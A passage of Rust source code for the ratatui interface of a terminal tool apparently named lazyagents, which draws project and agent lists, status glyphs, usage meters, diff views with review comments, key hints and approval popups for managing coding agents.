use std::path::Path;
use std::time::Instant;

use protocol::{AgentInfo, AgentKind, Color as ScreenColor, Screen, Status};
use ratatui::Frame;
use ratatui::buffer::Buffer;
use ratatui::crossterm::event::KeyCode;
use ratatui::layout::{Margin, Position, Rect};
use ratatui::style::{Color, Modifier, Style, Stylize};
use ratatui::text::{Line, Span};
use ratatui::widgets::{
    Block, BorderType, Borders, Clear, List, ListItem, ListState, Paragraph, Wrap,
};

use crate::app::{
    AgentView, App, CommandRun, DiffView, Field, Focus, MIN_PANE, MessageKind, NewAgentForm, Popup,
    Preset, ProjectField, ProjectForm, ScreenMode, Selection, Submission,
};
use crate::commands::Prompt;
use crate::config::Theme;
use crate::fixed_keys::{self, DIFF_HINTS, DIFF_KEYS, DiffKey};
use crate::keymap::{Action, Keymap};

pub const PULSE_TICKS: u64 = 10;
pub const WORKING_ORANGE: Color = Color::Rgb(0xDB, 0x6D, 0x28);

const FORM_HINT: &str = "tab field · ←/→ change · enter start · esc cancel";
const CONFIRM_HINT: &str = "y/enter confirm · n/esc cancel";
const OUTPUT_HINT: &str = "j/k scroll · q close";
const MENU_HINT: &str = "j/k move · enter run · esc cancel";
const INPUT_HINT: &str = "enter ok · esc cancel";
const SENDING_HINT: &str = "waiting for the daemon · esc close";
const REPLY_HINT: &str = "enter send · esc cancel";
const COMMENT_HINT: &str = "enter save (empty removes) · esc cancel";
const SETUP_HINT: &str = "y run it and remember · s skip it this time · n cancel";
const SETUP_SCROLL_HINT: &str = "j/k scroll to the end to approve · s skip it · n cancel";
const SETUP_TOO_SMALL: &str = "The terminal is too small to show the script · s skip it · n cancel";
const CHOICE_HINT: &str = "j/k move · enter pick · esc cancel";
const PICKER_HINT: &str = "j/k move · enter add · x forget · esc cancel";
const PROJECT_FORM_HINT: &str = "tab field · enter add · esc cancel";
const PICKER_ROWS: usize = 12;
const NEW_AGENT_WIDTH: u16 = 56;
const FORM_WIDTH: u16 = 60;

const SIDEBAR_HINT: [(Action, &str); 12] = [
    (Action::Help, "help"),
    (Action::Quit, "quit"),
    (Action::Open, "open"),
    (Action::NewAgent, "new"),
    (Action::Stop, "stop"),
    (Action::Restart, "restart"),
    (Action::Remove, "remove"),
    (Action::Rename, "rename"),
    (Action::AddProject, "add project"),
    (Action::ToggleAllAgents, "all"),
    (Action::NextAttention, "next input"),
    (Action::Diff, "diff"),
];

const SIDEBAR_HELP: [(&[Action], &str); 19] = [
    (
        &[Action::Down, Action::Up],
        "move down / up in the focused box",
    ),
    (
        &[Action::FocusProjects, Action::FocusAgents],
        "focus Projects / Agents",
    ),
    (&[Action::ToggleFocus], "switch between Projects and Agents"),
    (
        &[Action::Open],
        "open the agent's pane, restarting it if it is not running",
    ),
    (&[Action::NewAgent], "new agent"),
    (&[Action::Stop, Action::Restart], "stop / restart agent"),
    (
        &[Action::Remove, Action::Rename],
        "remove / rename agent (in Projects: the project)",
    ),
    (&[Action::ScreenMode], "wider pane / full screen / normal"),
    (&[Action::AddProject], "add project"),
    (&[Action::ToggleAllAgents], "all agents / this project"),
    (
        &[Action::NextAttention],
        "next agent needing input, then next done",
    ),
    (&[Action::Filter], "filter the agents (esc clears)"),
    (&[Action::Commands], "custom commands"),
    (
        &[Action::Approve, Action::Deny, Action::Reply],
        "approve / deny / reply to the agent",
    ),
    (
        &[Action::Diff, Action::Finish],
        "diff / finish (merge, PR, clean up) a worktree agent",
    ),
    (&[Action::Scroll], "scroll the agent's history"),
    (
        &[Action::PeekDown, Action::PeekUp],
        "scroll the agent's pane down / up from here",
    ),
    (&[Action::Help], "help"),
    (
        &[Action::Quit, Action::StopDaemon],
        "quit (agents keep running) / stop the daemon too",
    ),
];
const FILTER_HINT: &str = "enter keep · esc clear";
const TOO_SMALL: &str = "terminal too small";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Areas {
    pub projects: Rect,
    pub agents: Rect,
    pub info: Rect,
    pub pane: Rect,
    pub pane_inner: Rect,
    pub status: Rect,
    pub screen: Rect,
}

const INFO_MIN_HEIGHT: u16 = 6;
const AGENTS_MIN_HEIGHT: u16 = 8;

pub fn layout(area: Rect, app: &App) -> Areas {
    areas_in(
        area,
        app.projects.len(),
        info_rows(app).len(),
        app.screen_mode,
    )
}

pub const WIDE_SIDEBAR: u16 = 18;

pub fn areas(area: Rect, project_count: usize, info_lines: usize) -> Areas {
    areas_in(area, project_count, info_lines, ScreenMode::Normal)
}

/// The Info box fits `info_lines` lines, but never takes the Agents box below
/// `AGENTS_MIN_HEIGHT` rows to do so; it keeps `INFO_MIN_HEIGHT` rows while they fit.
pub fn areas_in(area: Rect, project_count: usize, info_lines: usize, mode: ScreenMode) -> Areas {
    let body_height = area.height.saturating_sub(1);
    let status = Rect::new(area.x, area.y + body_height, area.width, area.height.min(1));
    let sidebar_width = match mode {
        ScreenMode::Normal => (area.width / 4).clamp(24, 40),
        ScreenMode::Wide => WIDE_SIDEBAR,
        ScreenMode::Full => 0,
    }
    .min(area.width);
    let projects_height = (project_count.clamp(1, 6) as u16 + 2).min(body_height);
    let below_projects = body_height - projects_height;
    let wanted = u16::try_from(info_lines)
        .unwrap_or(u16::MAX)
        .saturating_add(2)
        .max(INFO_MIN_HEIGHT);
    let room = below_projects
        .saturating_sub(AGENTS_MIN_HEIGHT)
        .max(INFO_MIN_HEIGHT);
    let info_height = wanted.min(room).min(below_projects);
    let agents_height = body_height - projects_height - info_height;
    let projects = Rect::new(area.x, area.y, sidebar_width, projects_height);
    let agents = Rect::new(area.x, projects.bottom(), sidebar_width, agents_height);
    let info = Rect::new(area.x, agents.bottom(), sidebar_width, info_height);
    let pane = Rect::new(
        area.x + sidebar_width,
        area.y,
        area.width - sidebar_width,
        body_height,
    );
    Areas {
        projects,
        agents,
        info,
        pane,
        pane_inner: pane.inner(Margin::new(1, 1)),
        status,
        screen: area,
    }
}

/// The item of a bordered list at row `y`. ratatui scrolls a list only as far as needed to
/// show the selected item, starting from offset 0 on every frame.
pub fn row_at(area: Rect, selected: usize, len: usize, y: u16) -> Option<usize> {
    let inner = area.inner(Margin::new(0, 1));
    if inner.height == 0 || y < inner.y || y >= inner.bottom() {
        return None;
    }
    let offset = selected.saturating_sub(usize::from(inner.height) - 1);
    let index = offset + usize::from(y - inner.y);
    (index < len).then_some(index)
}

pub fn glyph(status: Status, tick: u64, theme: &Theme) -> (&'static str, Style) {
    match status {
        Status::Starting if (tick / 5).is_multiple_of(2) => ("○", Style::new().fg(theme.dim)),
        Status::Starting => ("○", Style::new().fg(theme.dim).dim()),
        Status::Working => ("●", Style::new().fg(working_colour(tick, theme))),
        Status::NeedsInput => ("●", Style::new().fg(theme.attention)),
        Status::Idle => ("●", Style::new().fg(theme.idle)),
        Status::Exited(0) => ("●", Style::new().fg(theme.dim)),
        Status::Exited(_) => ("●", Style::new().fg(theme.error)),
        Status::Stopped => ("○", Style::new().fg(theme.dim)),
    }
}

/// The default working colour pulses to orange and back every `PULSE_TICKS`; a configured
/// one stays steady, since blending it with orange could give any colour.
fn working_colour(tick: u64, theme: &Theme) -> Color {
    let (Color::Rgb(r0, g0, b0), Color::Rgb(r1, g1, b1)) = (theme.working, WORKING_ORANGE) else {
        return theme.working;
    };
    if theme.working != Theme::default().working {
        return theme.working;
    }
    let half = PULSE_TICKS / 2;
    let phase = tick % PULSE_TICKS;
    let step = phase.min(PULSE_TICKS - phase);
    let blend = |from: u8, to: u8| {
        let (from, to) = (i64::from(from), i64::from(to));
        (from + (to - from) * step as i64 / half as i64) as u8
    };
    Color::Rgb(blend(r0, r1), blend(g0, g1), blend(b0, b1))
}

fn convert(color: ScreenColor) -> Color {
    match color {
        ScreenColor::Default => Color::Reset,
        ScreenColor::Indexed(index) => Color::Indexed(index),
        ScreenColor::Rgb(r, g, b) => Color::Rgb(r, g, b),
    }
}

pub fn render_screen(screen: &Screen, area: Rect, buf: &mut Buffer) -> Option<Position> {
    for (y, line) in screen
        .lines
        .iter()
        .enumerate()
        .take(usize::from(area.height))
    {
        for (x, cell) in line.iter().enumerate().take(usize::from(area.width)) {
            if cell.text.is_empty() {
                continue;
            }
            let Some(target) = buf.cell_mut((area.x + x as u16, area.y + y as u16)) else {
                continue;
            };
            let flags = [
                (cell.style.bold, Modifier::BOLD),
                (cell.style.dim, Modifier::DIM),
                (cell.style.italic, Modifier::ITALIC),
                (cell.style.underline, Modifier::UNDERLINED),
                (cell.style.reverse, Modifier::REVERSED),
                (cell.style.strikethrough, Modifier::CROSSED_OUT),
            ];
            let modifier = flags
                .into_iter()
                .filter(|(on, _)| *on)
                .fold(Modifier::empty(), |all, (_, flag)| all | flag);
            target.set_symbol(&cell.text).set_style(
                Style::new()
                    .fg(convert(cell.fg))
                    .bg(convert(cell.bg))
                    .add_modifier(modifier),
            );
        }
    }
    let (x, y) = screen.cursor?;
    (x < area.width && y < area.height).then(|| Position::new(area.x + x, area.y + y))
}

fn rounded() -> Block<'static> {
    Block::bordered().border_type(BorderType::Rounded)
}

fn block(title: impl Into<Line<'static>>, focused: bool, theme: &Theme) -> Block<'static> {
    let border = if focused { theme.accent } else { theme.border };
    rounded().title(title).border_style(border)
}

pub fn draw(frame: &mut Frame, app: &App, areas: &Areas, now: Instant, tick: u64) {
    if areas.pane_inner.width < MIN_PANE.0 || areas.pane_inner.height < MIN_PANE.1 {
        draw_too_small(frame);
        return;
    }
    draw_projects(frame, app, areas.projects);
    draw_agents(frame, app, areas.agents, tick);
    draw_info(frame, app, areas.info);
    draw_pane(frame, app, areas);
    draw_status(frame, app, areas.status, now);
    if let Some(popup) = app.popup.as_ref().filter(|p| **p != Popup::Filter) {
        draw_popup(frame, popup, app, frame.area());
    }
}

/// The selected row keeps its own colours; it is bold, and only in the focused box it
/// also gets the `selected` background.
fn selection_style(focused: bool, theme: &Theme) -> Style {
    let style = Style::new().bold();
    if focused {
        style.bg(theme.selected)
    } else {
        style
    }
}

fn selectable_list(
    items: Vec<ListItem<'static>>,
    selected: usize,
    block: Block<'static>,
    style: Style,
) -> (List<'static>, ListState) {
    let list = List::new(items)
        .block(block)
        .highlight_symbol("▸ ")
        .highlight_style(style);
    (list, ListState::default().with_selected(Some(selected)))
}

/// `name` led by the first plain digit key bound to `action`, as lazygit numbers its boxes.
fn numbered(keymap: &Keymap, action: Action, name: &str) -> String {
    let digit = keymap.keys(action).into_iter().find(|key| {
        matches!(key.code, KeyCode::Char(c) if c.is_ascii_digit()) && !key.ctrl && !key.alt
    });
    match digit {
        Some(key) => format!(" [{key}] {name} "),
        None => format!(" {name} "),
    }
}

fn draw_projects(frame: &mut Frame, app: &App, area: Rect) {
    let title = numbered(&app.keymap, Action::FocusProjects, "Projects");
    let block = block(title, app.focus == Focus::Projects, &app.theme);
    if app.projects.is_empty() {
        let open_sides = block.borders(Borders::TOP | Borders::BOTTOM);
        let add = app.keymap.first_key(Action::AddProject);
        frame.render_widget(
            Paragraph::new(format!("press {add} to add a project")).block(open_sides),
            area,
        );
        return;
    }
    let items = app
        .projects
        .iter()
        .map(|project| {
            let attention = app.attention(project.id);
            let mut spans = vec![Span::raw(project.name.clone())];
            if attention > 0 {
                spans.push(Span::raw(" "));
                spans.push(Span::raw(format!("● {attention}")).fg(app.theme.attention));
            }
            ListItem::new(Line::from(spans))
        })
        .collect();
    let style = selection_style(app.focus == Focus::Projects, &app.theme);
    let (list, mut state) = selectable_list(items, app.project_index, block, style);
    frame.render_stateful_widget(list, area, &mut state);
}

/// A Claude agent is listed by its session's title once it has one.
pub(crate) fn label(agent: &AgentInfo) -> &str {
    match (&agent.title, agent.kind) {
        (Some(title), AgentKind::Claude) => title,
        _ => &agent.name,
    }
}

fn agent_row(app: &App, agent: &AgentInfo, tick: u64) -> ListItem<'static> {
    let unseen = app.is_unseen(agent.id);
    let (symbol, style) = match unseen {
        true => ("●", Style::new().fg(app.theme.done)),
        false => glyph(agent.status, tick, &app.theme),
    };
    let name = match app.view {
        AgentView::All => {
            let project = app.projects.iter().find(|p| p.id == agent.project);
            format!(
                "{}/{}",
                project.map_or("?", |p| p.name.as_str()),
                label(agent)
            )
        }
        AgentView::Project => label(agent).to_string(),
    };
    let rest = format!(" {name}  {}", app.status_label(agent));
    let line = Line::from(vec![Span::styled(symbol, style), Span::raw(rest)]);
    ListItem::new(if agent.status == Status::NeedsInput {
        line.fg(app.theme.attention)
    } else {
        line
    })
}

fn draw_agents(frame: &mut Frame, app: &App, area: Rect, tick: u64) {
    let name = match app.view {
        AgentView::Project => "Agents",
        AgentView::All => "Agents · all",
    };
    let mut title = numbered(&app.keymap, Action::FocusAgents, name);
    if !app.filter().is_empty() {
        title.push_str(&format!("· /{} ", app.filter()));
    }
    let block = block(title, app.focus == Focus::Agents, &app.theme);
    let agents = app.visible_agents();
    if agents.is_empty() {
        let new = app.keymap.first_key(Action::NewAgent);
        let text = filter_miss(app).unwrap_or_else(|| format!("no agents — press {new}"));
        let text = Paragraph::new(text).wrap(Wrap { trim: true });
        frame.render_widget(text.block(block), area);
        return;
    }
    let items = agents.iter().map(|a| agent_row(app, a, tick)).collect();
    let style = selection_style(app.focus == Focus::Agents, &app.theme);
    let (list, mut state) = selectable_list(items, app.agent_index, block, style);
    frame.render_stateful_widget(list, area, &mut state);
}

/// What an empty Agents box says while the filter hides every agent.
fn filter_miss(app: &App) -> Option<String> {
    match app.filter() {
        "" => None,
        filter => Some(format!("no agents match /{filter} · esc clears")),
    }
}

fn kind_label(kind: AgentKind) -> &'static str {
    match kind {
        AgentKind::Claude => "claude",
        AgentKind::Generic => "generic",
    }
}

const INFO_LABEL_WIDTH: usize = 8;
const METER_WIDTH: usize = 8;

/// One Info box row: a dim label, and a value that starts in the same column on every row.
pub struct InfoRow {
    label: &'static str,
    value: InfoValue,
}

enum InfoValue {
    /// Cut on the right when it does not fit.
    Text(Vec<Span<'static>>),
    /// Cut on the left, keeping the end that tells paths and branches apart.
    Tail(String),
    /// A percentage, drawn with a bar when there is room for one.
    Meter(u8),
}

impl InfoRow {
    fn text(label: &'static str, value: impl Into<String>) -> Self {
        Self::spans(label, vec![Span::raw(value.into())])
    }

    fn spans(label: &'static str, spans: Vec<Span<'static>>) -> Self {
        InfoRow {
            label,
            value: InfoValue::Text(spans),
        }
    }

    fn tail(label: &'static str, value: String) -> Self {
        InfoRow {
            label,
            value: InfoValue::Tail(value),
        }
    }
}

/// Git rows come right after what the agent waits for, so they stay visible when a short
/// terminal clips the box.
pub fn info_rows(app: &App) -> Vec<InfoRow> {
    let theme = &app.theme;
    match (app.selected_agent(), app.selected_project()) {
        (Some(agent), _) => {
            let mut rows = Vec::new();
            if let Some(waiting) = agent
                .waiting_for
                .as_ref()
                .filter(|_| agent.status == Status::NeedsInput)
            {
                let waiting = Span::raw(waiting.clone()).fg(theme.attention);
                rows.push(InfoRow::spans("waiting", vec![waiting]));
            }
            if let Some(worktree) = &agent.worktree {
                rows.push(InfoRow::tail("branch", worktree.branch.clone()));
            }
            if let Some(stat) = app.git_stats.get(&agent.id) {
                let changes = vec![
                    Span::raw(format!("+{}", stat.insertions)).fg(theme.diff_add),
                    Span::raw(" "),
                    Span::raw(format!("−{}", stat.deletions)).fg(theme.diff_remove),
                ];
                rows.push(InfoRow::spans("changes", changes));
                rows.push(InfoRow::text("files", format!("{} changed", stat.files)));
                rows.push(InfoRow::text(
                    "",
                    format!("{} uncommitted", stat.uncommitted),
                ));
            }
            if let Some(usage) = &agent.usage {
                if let Some(number) = usage.pr_number {
                    let review = usage.pr_review.as_ref();
                    let text = match review {
                        Some(review) => format!("#{number} {}", review.replace('_', " ")),
                        None => format!("#{number}"),
                    };
                    rows.push(InfoRow::text("PR", text));
                }
                rows.extend(
                    usage
                        .model
                        .clone()
                        .map(|model| InfoRow::text("model", model)),
                );
                rows.extend(usage.context_percent.map(|percent| InfoRow {
                    label: "context",
                    value: InfoValue::Meter(percent),
                }));
                rows.extend(
                    usage
                        .cost_micros
                        .map(|micros| format!("${:.2}", micros as f64 / 1_000_000.0))
                        .map(|cost| InfoRow::text("cost", cost)),
                );
                let limits = limit_spans(usage, theme);
                if !limits.is_empty() {
                    rows.push(InfoRow::spans("limits", limits));
                }
            }
            rows.push(InfoRow::tail("cwd", app.display_path(&agent.cwd)));
            rows
        }
        (None, Some(project)) => vec![InfoRow::tail("path", app.display_path(&project.path))],
        (None, None) => Vec::new(),
    }
}

/// `5h 24% · 7d 41%`, each percentage in its usage level's colour.
fn limit_spans(usage: &protocol::Usage, theme: &Theme) -> Vec<Span<'static>> {
    let mut spans = Vec::new();
    for (window, used) in [
        ("5h", usage.five_hour_percent),
        ("7d", usage.seven_day_percent),
    ] {
        let Some(used) = used else { continue };
        if !spans.is_empty() {
            spans.push(Span::raw(" · "));
        }
        spans.push(Span::raw(format!("{window} ")));
        spans.push(Span::styled(format!("{used}%"), usage_style(used, theme)));
    }
    spans
}

/// Yellow from 60 % used, red from 80 %.
fn usage_style(percent: u8, theme: &Theme) -> Style {
    match percent {
        80.. => Style::new().fg(theme.error),
        60.. => Style::new().fg(theme.working),
        _ => Style::new(),
    }
}

fn info_line(row: InfoRow, width: usize, theme: &Theme) -> Line<'static> {
    let label = format!("{:<INFO_LABEL_WIDTH$}", row.label);
    let room = width.saturating_sub(INFO_LABEL_WIDTH);
    let mut spans = vec![Span::raw(label).fg(theme.dim)];
    match row.value {
        InfoValue::Text(value) => spans.extend(clip_right(value, room)),
        InfoValue::Tail(value) => spans.push(Span::raw(clip_left(&value, room))),
        InfoValue::Meter(percent) => spans.extend(meter(percent, room, theme)),
    }
    Line::from(spans)
}

fn clip_right(spans: Vec<Span<'static>>, room: usize) -> Vec<Span<'static>> {
    let total: usize = spans.iter().map(|span| span.content.chars().count()).sum();
    if total <= room {
        return spans;
    }
    let mut left = room.saturating_sub(1);
    let mut clipped = Vec::new();
    for span in spans {
        let text: String = span.content.chars().take(left).collect();
        left -= text.chars().count();
        clipped.push(Span::styled(text, span.style));
        if left == 0 {
            break;
        }
    }
    clipped.push(Span::raw("…"));
    clipped
}

fn clip_left(text: &str, room: usize) -> String {
    let count = text.chars().count();
    if count <= room {
        return text.to_string();
    }
    let kept: String = text.chars().skip(count + 1 - room.max(1)).collect();
    format!("…{kept}")
}

/// `██░░░░░░ 42%`, or just `42%` where the bar does not fit.
fn meter(percent: u8, room: usize, theme: &Theme) -> Vec<Span<'static>> {
    let style = usage_style(percent, theme);
    let number = format!("{percent}%");
    if room < METER_WIDTH + 1 + number.len() {
        return vec![Span::styled(number, style)];
    }
    let filled = (usize::from(percent.min(100)) * METER_WIDTH + 50) / 100;
    vec![
        Span::styled("█".repeat(filled), style),
        Span::raw("░".repeat(METER_WIDTH - filled)).fg(theme.dim),
        Span::raw(" "),
        Span::styled(number, style),
    ]
}

fn draw_info(frame: &mut Frame, app: &App, area: Rect) {
    let width = usize::from(area.width.saturating_sub(2));
    let text: Vec<Line> = info_rows(app)
        .into_iter()
        .map(|row| info_line(row, width, &app.theme))
        .collect();
    let block = block(" Info ", false, &app.theme);
    frame.render_widget(Paragraph::new(text).block(block), area);
}

fn draw_pane(frame: &mut Frame, app: &App, areas: &Areas) {
    let focused = app.focus == Focus::Pane;
    let agent = app.selected_agent();
    if let (Some(view), Some(agent)) = (&app.diff, agent) {
        let files = match view.files() {
            1 => " · 1 file".to_string(),
            n if view.lines.is_some() => format!(" · {n} files"),
            _ => String::new(),
        };
        let title = format!(" diff · {} · {}{files} ", label(agent), view.scope.label());
        frame.render_widget(block(title, true, &app.theme), areas.pane);
        frame.render_widget(
            diff_text(view, app, areas.pane_inner.height),
            areas.pane_inner,
        );
        return;
    }
    let title = match agent {
        Some(agent) => format!(
            " {} · {} · {} ",
            label(agent),
            kind_label(agent.kind),
            agent.status.label()
        ),
        None => " lazyagents ".to_string(),
    };
    let pane_block = if app.focus == Focus::Scroll {
        rounded().title(title).border_style(app.theme.scroll)
    } else {
        block(title, focused, &app.theme)
    };
    frame.render_widget(pane_block, areas.pane);
    let Some(agent) = agent else {
        let new = app.keymap.first_key(Action::NewAgent);
        let text = filter_miss(app).unwrap_or_else(|| format!("press {new} to start an agent"));
        frame.render_widget(Paragraph::new(text), areas.pane_inner);
        return;
    };
    if let Some(error) = &agent.last_error
        && !agent.status.is_running()
    {
        let retry = app.keymap.first_key(Action::Restart);
        let text = vec![
            Line::from(format!("failed to start: {error}")).fg(app.theme.error),
            Line::from(format!("press {retry} to retry")).fg(app.theme.dim),
        ];
        frame.render_widget(
            Paragraph::new(text).wrap(Wrap { trim: false }),
            areas.pane_inner,
        );
        return;
    }
    let cursor = render_screen(&app.screen, areas.pane_inner, frame.buffer_mut());
    if let Some(selection) = app.selection {
        draw_selection(selection, areas.pane_inner, frame.buffer_mut());
    }
    if let (true, Some(position)) = (focused, cursor) {
        frame.set_cursor_position(position);
    }
    if !agent.status.is_running() && app.focus != Focus::Scroll {
        draw_not_running(frame, app, agent, areas.pane_inner);
    }
}

/// A bar over the pane's bottom row, so a frozen screen does not pass for a live one.
fn draw_not_running(frame: &mut Frame, app: &App, agent: &AgentInfo, area: Rect) {
    if area.height == 0 {
        return;
    }
    let key = |action| app.keymap.first_key(action);
    let verb = if agent.status == Status::Stopped {
        "start"
    } else {
        "restart"
    };
    let text = format!(
        " {} · {} {verb} · {} remove",
        agent.status.label(),
        key(Action::Open),
        key(Action::Remove)
    );
    let colour = match agent.status {
        Status::Exited(code) if code != 0 => app.theme.error,
        _ => app.theme.dim,
    };
    let row = Rect {
        y: area.bottom() - 1,
        height: 1,
        ..area
    };
    frame.render_widget(Clear, row);
    frame.render_widget(
        Paragraph::new(text).style(Style::new().fg(Color::White).bg(colour)),
        row,
    );
}

fn draw_selection(selection: Selection, area: Rect, buf: &mut Buffer) {
    for row in selection.rows().filter(|row| *row < area.height) {
        let Some(columns) = selection.columns(row, area.width) else {
            continue;
        };
        for col in columns {
            if let Some(cell) = buf.cell_mut((area.x + col, area.y + row)) {
                cell.modifier.insert(Modifier::REVERSED);
            }
        }
    }
}

/// Draws the diff from its scroll position, the cursor line highlighted while the view has
/// focus and each review comment on a row of its own under its line.
fn diff_text<'a>(view: &'a DiffView, app: &App, height: u16) -> Paragraph<'a> {
    let theme = &app.theme;
    let Some(lines) = &view.lines else {
        return Paragraph::new("loading diff…").fg(theme.dim);
    };
    if lines.is_empty() {
        return Paragraph::new("no changes").fg(theme.dim);
    }
    let comments = app.comments.get(&view.agent).map_or(&[][..], Vec::as_slice);
    let height = usize::from(height);
    let mut rows = Vec::with_capacity(height);
    for (index, line) in lines.iter().enumerate().skip(view.scroll) {
        if rows.len() >= height {
            break;
        }
        let header = ["diff", "index", "---", "+++"]
            .iter()
            .any(|prefix| line.starts_with(prefix));
        let style = if header {
            Style::new().bold()
        } else if line.starts_with("@@") {
            Style::new().fg(theme.diff_hunk)
        } else if line.starts_with('+') {
            Style::new().fg(theme.diff_add)
        } else if line.starts_with('-') {
            Style::new().fg(theme.diff_remove)
        } else {
            Style::new()
        };
        let style = if index == view.cursor && app.focus == Focus::Diff {
            style.bg(theme.selected)
        } else {
            style
        };
        rows.push(Line::styled(line.as_str(), style));
        if let Some(Some(location)) = view.locations.get(index) {
            for comment in comments.iter().filter(|c| c.location == *location) {
                rows.push(Line::from(format!("  ✎ {}", comment.text)).fg(theme.accent));
            }
        }
    }
    rows.truncate(height);
    Paragraph::new(rows)
}

/// The diff view's hints; the configured diff key closes it too.
fn diff_hints(keymap: &Keymap) -> Vec<String> {
    let mut close = fixed_keys::keys(&DIFF_KEYS, DiffKey::Close);
    for key in keymap.keys(Action::Diff) {
        if !close.contains(&key) {
            close.push(key);
        }
    }
    let mut hints = vec![format!("{} close", crate::keymap::join(&close))];
    hints.extend(
        DIFF_HINTS
            .iter()
            .filter(|(keys, _)| *keys != [DiffKey::Close])
            .filter_map(|(keys, label)| fixed_keys::hint(&DIFF_KEYS, keys, label)),
    );
    hints.extend(fixed_keys::motion_hints());
    hints
}

fn pane_hint(keymap: &Keymap) -> String {
    format!(
        "{} sidebar · {} next agent · {} previous agent",
        keymap.describe(Action::PaneLeave),
        keymap.describe(Action::PaneNext),
        keymap.describe(Action::PanePrevious),
    )
}

fn sidebar_hint(keymap: &Keymap) -> String {
    SIDEBAR_HINT
        .iter()
        .filter_map(|(action, label)| {
            let key = keymap.keys(*action).first()?.to_string();
            Some(format!("{key} {label}"))
        })
        .collect::<Vec<_>>()
        .join(" · ")
}

/// What the selected agent's state calls for, shown before the usual hints: the answers to
/// a waiting agent, starting a stopped one, reviewing comments not yet sent.
fn state_hint(app: &App) -> Option<String> {
    let agent = app.selected_agent()?;
    let key = |action| app.keymap.first_key(action);
    let mut hints = Vec::new();
    match agent.status {
        Status::NeedsInput => hints.push(answer_hint(&app.keymap)),
        Status::Stopped => hints.push(format!("{} start", key(Action::Open))),
        Status::Exited(_) => hints.push(format!("{} restart", key(Action::Open))),
        _ => {}
    }
    if let Some(count) = app.comments.get(&agent.id).map(Vec::len) {
        let s = if count == 1 { "" } else { "s" };
        hints.push(format!("{} {count} comment{s} to send", key(Action::Diff)));
    }
    (!hints.is_empty()).then(|| hints.join(" · "))
}

/// The answers a waiting agent can be sent from the sidebar.
fn answer_hint(keymap: &Keymap) -> String {
    [
        (Action::Approve, "approve"),
        (Action::Deny, "deny"),
        (Action::Reply, "reply"),
    ]
    .iter()
    .filter_map(|(action, label)| Some(format!("{} {label}", keymap.keys(*action).first()?)))
    .collect::<Vec<_>>()
    .join(" · ")
}

fn draw_status(frame: &mut Frame, app: &App, area: Rect, now: Instant) {
    let theme = &app.theme;
    let mut spans = Vec::new();
    if let Some(message) = app.current_message(now) {
        let colour = match app.message_kind {
            MessageKind::Error => theme.error,
            MessageKind::Info => theme.accent,
        };
        spans.push(Span::raw(message.to_string()).fg(colour));
        spans.push(Span::raw(" │ ").fg(theme.dim));
    }
    if app.popup == Some(Popup::Filter) {
        let filter = format!("/{}", app.filter());
        let width = filter.chars().count() as u16;
        let line = Line::from(vec![
            Span::raw(filter).fg(theme.accent),
            Span::raw(" │ ").fg(theme.dim),
            Span::raw(FILTER_HINT).fg(theme.dim),
        ]);
        frame.render_widget(Paragraph::new(line), area);
        frame.set_cursor_position((area.x + width.min(area.width), area.y));
        return;
    }
    spans.push(match app.focus {
        Focus::Pane if app.prefix_pending => {
            Span::raw(format!("{} …", app.keymap.prefix())).fg(theme.working)
        }
        Focus::Pane => Span::raw(pane_hint(&app.keymap)).fg(theme.dim),
        Focus::Diff => Span::raw(diff_hints(&app.keymap).join(" · ")).fg(theme.dim),
        Focus::Scroll => {
            let hints = std::iter::once("SCROLL".to_string()).chain(fixed_keys::scroll_hints());
            Span::raw(hints.collect::<Vec<_>>().join(" · ")).fg(theme.scroll)
        }
        Focus::Projects | Focus::Agents => {
            let hint = match state_hint(app) {
                Some(state) => format!("{state} · {}", sidebar_hint(&app.keymap)),
                None => sidebar_hint(&app.keymap),
            };
            Span::raw(hint).fg(theme.dim)
        }
    });
    frame.render_widget(Paragraph::new(Line::from(spans)), area);
}

fn centered(area: Rect, width: u16, height: u16) -> Rect {
    let width = width.min(area.width);
    let height = height.min(area.height);
    Rect::new(
        area.x + (area.width - width) / 2,
        area.y + (area.height - height) / 2,
        width,
        height,
    )
}

fn draw_too_small(frame: &mut Frame) {
    let screen = frame.area();
    let rows = if usize::from(screen.width) >= TOO_SMALL.len() {
        1
    } else {
        2
    };
    frame.render_widget(
        Paragraph::new(TOO_SMALL)
            .centered()
            .wrap(Wrap { trim: true }),
        centered(screen, screen.width, rows),
    );
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mismatch {
    Asking,
    /// The pid of the daemon being stopped, when its lock names one.
    Stopping(Option<u32>),
}

pub fn draw_mismatch(
    frame: &mut Frame,
    daemon_version: &str,
    protocol_version: u32,
    stage: Mismatch,
) {
    let footer = match stage {
        Mismatch::Asking => "y restart · n quit".to_string(),
        Mismatch::Stopping(Some(pid)) => format!("stopping daemon {pid}…"),
        Mismatch::Stopping(None) => "stopping daemon…".to_string(),
    };
    let screen = frame.area();
    let lines = vec![
        Line::from(format!(
            "This lazyagents (protocol {}) can't talk to the running daemon {daemon_version} \
             (protocol {protocol_version}).",
            protocol::PROTOCOL_VERSION
        )),
        Line::from(""),
        Line::from("Restart the daemon? This stops every running agent."),
        Line::from(""),
        Line::from(footer).fg(Color::DarkGray),
    ];
    let block = rounded().title(" lazyagents ");
    let inner = block.inner(screen);
    frame.render_widget(block, screen);
    let width = usize::from(inner.width.max(1));
    let rows: usize = lines.iter().map(|l| l.width().max(1).div_ceil(width)).sum();
    let top = inner.height.saturating_sub(rows as u16) / 2;
    let area = Rect::new(inner.x, inner.y + top, inner.width, inner.height - top);
    frame.render_widget(
        Paragraph::new(lines).centered().wrap(Wrap { trim: true }),
        area,
    );
}

/// The approval popup for a worktree setup script, laid out for `screen`.
struct SetupView {
    width: u16,
    header: Vec<String>,
    body: Vec<String>,
    /// How many of `body`'s rows fit between the header and the footer.
    rows: usize,
    hint_width: usize,
    /// Whether the screen has room for the heading, one script row and the hint.
    fits: bool,
}

const SETUP_INDENT: usize = 2;
const SETUP_MIN_WIDTH: usize = 50;

impl SetupView {
    fn new(heading: &str, script: &str, screen: (u16, u16)) -> Self {
        let lines: Vec<String> = script.lines().map(escaped).collect();
        let longest = lines.iter().map(|l| text_width(l)).max().unwrap_or(0);
        let width = (longest + SETUP_INDENT)
            .max(text_width(heading))
            .max(SETUP_MIN_WIDTH - 4)
            + 4;
        let width = width.min(usize::from(screen.0)).max(3);
        let inner = width - 2;
        let body: Vec<String> = lines
            .iter()
            .flat_map(|l| wrap(l, inner.saturating_sub(SETUP_INDENT).max(1)))
            .collect();
        let header = wrap(heading, inner);
